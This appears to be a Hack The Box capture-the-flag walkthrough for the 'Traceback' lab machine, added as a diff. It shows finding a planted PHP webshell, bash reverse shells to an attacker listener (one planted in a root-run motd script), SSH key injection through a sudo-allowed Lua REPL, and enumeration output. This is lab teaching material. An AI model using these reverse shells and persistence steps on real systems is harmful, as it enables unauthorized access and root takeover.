@@ -1,0 +1,284 @@
+HTB - TRACEBACK
+
+Apparently the site has been hacked and we look at the page source of the web page been hosted on
+port 80 and realize that the hacker left some backdoors enabled. So we will most likely see a
+webshell we can use to get access.
+
+We want to guess what type of webserver this is. We will try php first. We will use gobuster along
+with a wordlist that is tailored to find php backdoors.
+COMMAND:
+====================================================================================================
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -u http://10.10.10.181/ -o backdoors.txt
+====================================================================================================
+OUTPUT 
+====================================================================================================
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.181/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/03 20:08:42 Starting gobuster
+===============================================================
+/smevk.php (Status: 200)
+===============================================================
+2020/12/03 20:08:43 Finished
+===============================================================
+====================================================================================================
+
+We get a hit for smevk.php, from the webpage we can attempt to put in credentials that can allow us 
+to access the webshell. Example, admin:admin. Lot of webshells havve bad/default passwords.
+
+We can now attmept to execute a command to get a reverse shell on the box, the command to achieve 
+this follows.
+
+COMMAND:
+====================================================================================================
+bash -c 'bash -i >& /dev/tcp/10.10.14.21/5555 0>&1'
+====================================================================================================
+OUTPUT 
+====================================================================================================
+root@kali:~/htb/traceback# nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.181] 40530
+bash: cannot set terminal process group (532): Inappropriate ioctl for device
+bash: no job control in this shell
+webadmin@traceback:/var/www/html$ 
+====================================================================================================
+
+We then go to the webadmin users home and find a note.txt from the sysadmin telling him about a tool
+used to practice LUA. So we will have to search for that.
+
+So one of the first things to do is find files owned by sysadmin.
+COMMAND:
+====================================================================================================
+find / -user sysadmin 2>/dev/null
+====================================================================================================
+OUTPUT:
+====================================================================================================
+/home/sysadmin
+/home/webadmin/note.txt
+====================================================================================================
+
+
+Nothing to interesting, so will search for any new files that have been recently added.
+COMMAND:
+====================================================================================================
+find / -newermt 2020-03-12 ! -newermt 2020-03-20 -ls 2>/dev/null
+====================================================================================================
+OUTPUT:
+====================================================================================================
+  1048577      4 drwxr-xr-x  80 root     root         4096 Mar 16  2020 /etc
+  1049060      4 -r--r-----   1 root     root          935 Mar 16  2020 /etc/sudoers
+   401042      4 drwxr-x---   5 sysadmin sysadmin     4096 Mar 16  2020 /home/sysadmin
+   396841      4 drwxr-x---   5 webadmin sysadmin     4096 Mar 16  2020 /home/webadmin
+   401046      4 -rw-rw-r--   1 sysadmin sysadmin      122 Mar 16  2020 /home/webadmin/note.txt
+   397685      4 -rw-------   1 webadmin webadmin      105 Mar 16  2020 /home/webadmin/.bash_history
+  1835011     20 drwxr-xr-x   2 root     root        20480 Mar 15  2020 /usr/bin
+  1321200      4 drwxr-xr-x   2 webadmin webadmin     4096 Mar 16  2020 /var/www/html
+  1311100      0 -rw-r--r--   1 root     root            0 Mar 15  2020 /var/lib/ubuntu-release-upgrader/release-upgrade-available
+  1312612      4 -rw-------   1 root     root         2145 Mar 15  2020 /var/log/vmware-vmsvc.2.log
+  1311553      4 -rw-------   1 root     root          705 Mar 15  2020 /var/log/vmware-network.3.log
+  1312322      4 -rw-rw----   1 root     utmp          384 Mar 16  2020 /var/log/btmp.1
+  1311749      4 -rw-------   1 root     root         2145 Mar 16  2020 /var/log/vmware-vmsvc.1.log
+  1312478     52 -rw-r-----   1 syslog   adm         53019 Mar 16  2020 /var/log/syslog.2.gz
+  1312584   8192 -rw-r-----   1 root     systemd-journal  8388608 Mar 16  2020 /var/log/journal/62ef2b37948840a89242352c1159a8cf/user-1001.journal
+  1312587   8192 -rw-r-----   1 root     systemd-journal  8388608 Mar 16  2020 /var/log/journal/62ef2b37948840a89242352c1159a8cf/user-1000.journal
+  1310761  24580 -rw-r-----   1 root     systemd-journal 25165824 Mar 15  2020 /var/log/journal/62ef2b37948840a89242352c1159a8cf/system@0005a0e834906632-40cd84257667f9ed.journal~
+  1312641      4 -rw-------   1 root     root                 685 Mar 15  2020 /var/log/vmware-network.4.log
+  1312282     64 -rw-r-----   1 syslog   adm                62353 Mar 16  2020 /var/log/kern.log.2.gz
+  1311796     36 -rw-rw-r--   1 root     utmp              292584 Mar 16  2020 /var/log/lastlog
+  1310744      4 -rw-------   1 root     root                 685 Mar 16  2020 /var/log/vmware-network.2.log
+  1310749      4 -rw-------   1 root     root                 705 Mar 16  2020 /var/log/vmware-network.1.log
+  1312320     68 -rw-r-----   1 syslog   adm                66589 Mar 16  2020 /var/log/auth.log.2.gz
+
+====================================================================================================
+
+Now we have all the files between those 2 dates. We don't have anything for Lua. We will now try 
+linenum.
+
+From the linpeas.sh output we come to find that we can run sudo as the sysadmin user with a script.
+COMMAND:
+====================================================================================================
+linpeas.sh 
+====================================================================================================
+OUTPUT 
+====================================================================================================
+   467	[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+   468	[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+   469	Matching Defaults entries for webadmin on traceback:
+   470	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+   471	
+   472	User webadmin may run the following commands on traceback:
+   473	    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+   474	
+====================================================================================================
+
+Looks lke we can run a script.
+COMMAND:
+====================================================================================================
+sudo -u sysadmin /home/sysadmin/luvit
+====================================================================================================
+OUTPUT:
+====================================================================================================
+webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
+Welcome to the Luvit repl!
+> help
+nil
+> 
+====================================================================================================
+
+Most likely an lua script or code we can run to try and get a reverse shell. Instead we might want
+to write to the ssh directory with keys.
+
+CODE:
+====================================================================================================
+file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
+io.output(file)
+io.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZOw1rymRpf9KpCY4NU7oyvK9MKxTmb0SAL809R1ad6liLCWWdbVgUR/JgdNK0ufyThKubbeZpdciOveS+GP9m/ATxEYzPoiNM8Z4cKmL04ah50ZRO+wnTr7+lKeb7hDYz/HxfNYRuhSX5Kidi3t3i7+rL/ZaHCK+cy5zjB0T3QubzjsPWqtlus6Jc64S/JFfcYmut8gjEFD4trQngN+W4ZQcXNnm/6m3+Z0el/W+m6sy79D3q/n/V80smmGiweDb6yxVXSk81A9DMgRKvN/CncGo913Zgynoy3tXp+32eMNPoJFGuoMqn7hlk57GIZ44Ou/qUD7mPa/JQMrr8ucGUyUZ4H31YU8QpQDO8vxmg7GKoZI50+fSQvFkiwgHZ0J4NQ8tnio5/O9lrDFmEfTFLw+waXwLrMAFU2wLbeWgLmYfdQ1WWC/qTk9gXQsPdDZtGpjS2TT842SNHUlzMuFnj2KGECQpKGkpj99K6iXMR6F5r04c5P3++ZewDgrcsF38=")
+io.close(file)
+====================================================================================================
+
+Now we can just add the code a file on the local system and execute it using the script with sudo
+
+COMMAND:
+====================================================================================================
+#Victim machine
+sudo -u sysadmin /home/sysadmin/luvit runme.lua
+#Attacker
+ssh -i sysadmin sysadmin@10.10.10.181
+====================================================================================================
+OUTPUT 
+====================================================================================================
+The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
+ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
+#################################
+-------- OWNED BY XH4H  ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land 
+
+
+
+Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
+$ whoami
+sysadmin
+
+====================================================================================================
+
+Now we have a shell as sysadmin and we get the user.tx, you could have also looked at webadmins bash
+history and yo could have "traced back" how was able to pivot to the sysadmin user without having
+to do the previous steps.
+
+Now that we havve pivoted to the sysadmin user we can try and see if there is any active processes 
+going on within the system. We will use pspy to see if there is anything that is being ran.
+
+COMMAND:
+====================================================================================================
+./pspy64
+====================================================================================================
+OUTPUT 
+====================================================================================================
+...
+..
+..
+2020/12/03 19:16:01 CMD: UID=0    PID=1400   | sleep 30 
+2020/12/03 19:16:01 CMD: UID=0    PID=1399   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
+2020/12/03 19:16:01 CMD: UID=0    PID=1398   | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
+2020/12/03 19:16:01 CMD: UID=0    PID=1397   | /usr/sbin/CRON -f 
+...
+..
+.
+====================================================================================================
+
+As we can see there is a cron job actively backing up files into the motd directory as root.
+The message of the day scripts get written when someone logs in. We can edit one of the files so that
+when the cron executes when we ssh in we can get code execution as root.
+
+One of the things we can do is search to find which directories sysadmin can write to.
+
+COMMAND:
+====================================================================================================
+find / -group sysadmin -writable -ls 2>/dev/null | grep -v ' /proc\| /run\| /sys' 
+====================================================================================================
+OUTPUT 
+====================================================================================================
+  1049058      8 -rwxrwxr-x   1 root     sysadmin     4264 Dec  3 19:29 /etc/update-motd.d/50-motd-news
+  1049057      4 -rwxrwxr-x   1 root     sysadmin      982 Dec  3 19:29 /etc/update-motd.d/10-help-text
+  1050413      4 -rwxrwxr-x   1 root     sysadmin      299 Dec  3 19:29 /etc/update-motd.d/91-release-upgrade
+  1049056      4 -rwxrwxr-x   1 root     sysadmin      981 Dec  3 19:29 /etc/update-motd.d/00-header
+  1049059      4 -rwxrwxr-x   1 root     sysadmin      604 Dec  3 19:29 /etc/update-motd.d/80-esm
+   401042      4 drwxr-x---   5 sysadmin sysadmin     4096 Mar 16  2020 /home/sysadmin
+   401043      4 -rw-r--r--   1 sysadmin sysadmin     3771 Apr  4  2018 /home/sysadmin/.bashrc
+   401040   4296 -rwxrwxr-x   1 sysadmin sysadmin  4397566 Aug 24  2019 /home/sysadmin/luvit
+   401044      4 -rw-r--r--   1 sysadmin sysadmin      220 Apr  4  2018 /home/sysadmin/.bash_logout
+   401051      4 -rw-r--r--   1 sysadmin sysadmin     1115 Dec  3 19:13 /home/sysadmin/.ssh/authorized_keys
+   401053      4 drwx------   2 sysadmin sysadmin     4096 Aug 25  2019 /home/sysadmin/.cache
+   401054      0 -rw-r--r--   1 sysadmin sysadmin        0 Aug 25  2019 /home/sysadmin/.cache/motd.legal-displayed
+   401049      4 -rw-------   1 sysadmin sysadmin        1 Aug 25  2019 /home/sysadmin/.bash_history
+   401047      4 drwxrwxr-x   3 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local
+   401048      4 drwx------   3 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local/share
+   534230      4 drwx------   2 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local/share/nano
+   401045      4 -rw-r--r--   1 sysadmin sysadmin      807 Apr  4  2018 /home/sysadmin/.profile
+   401046      4 -rw-rw-r--   1 sysadmin sysadmin      122 Mar 16  2020 /home/webadmin/note.txt
+        3   1132 -rwxr-xr-x   1 sysadmin sysadmin  1156536 Aug 22  2019 /dev/shm/pspy64s
+  1049058      8 -rwxrwxr-x   1 root     sysadmin     4264 Dec  3 19:29 /etc/update-motd.d/50-motd-news
+  1049057      4 -rwxrwxr-x   1 root     sysadmin      982 Dec  3 19:29 /etc/update-motd.d/10-help-text
+  1050413      4 -rwxrwxr-x   1 root     sysadmin      299 Dec  3 19:29 /etc/update-motd.d/91-release-upgrade
+  1049056      4 -rwxrwxr-x   1 root     sysadmin      981 Dec  3 19:29 /etc/update-motd.d/00-header
+  1049059      4 -rwxrwxr-x   1 root     sysadmin      604 Dec  3 19:29 /etc/update-motd.d/80-esm
+   401042      4 drwxr-x---   5 sysadmin sysadmin     4096 Mar 16  2020 /home/sysadmin
+   401043      4 -rw-r--r--   1 sysadmin sysadmin     3771 Apr  4  2018 /home/sysadmin/.bashrc
+   401040   4296 -rwxrwxr-x   1 sysadmin sysadmin  4397566 Aug 24  2019 /home/sysadmin/luvit
+   401044      4 -rw-r--r--   1 sysadmin sysadmin      220 Apr  4  2018 /home/sysadmin/.bash_logout
+   401051      4 -rw-r--r--   1 sysadmin sysadmin     1115 Dec  3 19:13 /home/sysadmin/.ssh/authorized_keys
+   401053      4 drwx------   2 sysadmin sysadmin     4096 Aug 25  2019 /home/sysadmin/.cache
+   401054      0 -rw-r--r--   1 sysadmin sysadmin        0 Aug 25  2019 /home/sysadmin/.cache/motd.legal-displayed
+   401049      4 -rw-------   1 sysadmin sysadmin        1 Aug 25  2019 /home/sysadmin/.bash_history
+   401047      4 drwxrwxr-x   3 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local
+   401048      4 drwx------   3 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local/share
+   534230      4 drwx------   2 sysadmin sysadmin     4096 Aug 24  2019 /home/sysadmin/.local/share/nano
+   401045      4 -rw-r--r--   1 sysadmin sysadmin      807 Apr  4  2018 /home/sysadmin/.profile
+   401046      4 -rw-rw-r--   1 sysadmin sysadmin      122 Mar 16  2020 /home/webadmin/note.txt
+        3   1132 -rwxr-xr-x   1 sysadmin sysadmin  1156536 Aug 22  2019 /dev/shm/pspy64s
+====================================================================================================
+
+
+Based on the output, we can write to the "/etc/update-motd.d/" which basically backs up everything 
+within that directory, so we can write to any of the files and when someone logs in that file and its
+contents are executed.
+OUTPUT:
+====================================================================================================
+2020/12/03 19:34:24 CMD: UID=106  PID=1567   | sshd: [net]          
+2020/12/03 19:34:24 CMD: UID=0    PID=1569   | run-parts --lsbsysinit /etc/update-motd.d 
+2020/12/03 19:34:24 CMD: UID=0    PID=1568   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+====================================================================================================
+
+So we edit one of the files in the directory and use netcat to wait for a login for the script to 
+execute and send back a reverse shell
+COMMAND:
+====================================================================================================
+nano 00-header
+bash -c 'bash -i >& /dev/tcp/10.10.14.21/5555 0>&1'
+====================================================================================================
+OUTPUT:
+====================================================================================================
+root@kali:~/htb/traceback/ssh# nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.181] 60504
+bash: cannot set terminal process group (1839): Inappropriate ioctl for device
+bash: no job control in this shell
+root@traceback:/# ifconfig
+====================================================================================================
+
+COMMAND:
+====================================================================================================
+====================================================================================================
